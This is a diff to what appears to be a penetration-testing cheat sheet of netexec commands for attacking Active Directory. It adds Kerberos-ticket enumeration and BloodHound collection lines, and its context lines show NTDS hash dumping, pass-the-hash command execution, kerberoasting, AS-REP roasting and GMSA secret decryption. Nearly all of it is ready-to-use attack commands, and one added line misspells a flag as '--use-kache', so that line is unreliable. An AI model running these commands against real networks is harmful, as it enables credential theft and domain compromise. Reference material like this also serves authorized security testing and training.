@@ -3367,7 +3367,7 @@ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>    
 netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>     // Dump NTDS for user with hash
 netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                      // Exec command with hash
 netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>                         // Generate relay list
-netexec ldap <RHOST> -u '' -p '' -M -user-desc                                   // Enumerate user descriptions
+netexec ldap <RHOST> -u '' -p '' -M user-desc                                   // Enumerate user descriptions
 netexec ldap <RHOST> -u '' -p '' -M get-desc-users                               // Get users with descriptions
 netexec ldap <RHOST> -u '' -p '' -M ldap-checker                                 // LDAP checker module
 netexec ldap <RHOST> -u '' -p '' -M veeam                                        // Veeam module
@@ -3381,6 +3381,12 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerb
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast // AS-REP roast hashes
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa                      // Enumerate GMSA accounts
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k                   // GMSA with Kerberos
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --users // Enumerate users with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --active-users // Enumerate active users with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --groups // Enumerate groups with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --groups "GROUP_NAME"      // Enumerate users in specific group with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache -M get-desc-user      // Get full user description with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> --kdcHost <IP> --use-kache --bloodhound --collection All <FQDN> --dns-server <IP> // Bloodhound collection with Kerberos ticket
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>      // Convert GMSA ID
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT> // Decrypt GMSA LSA
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation           // Find delegation
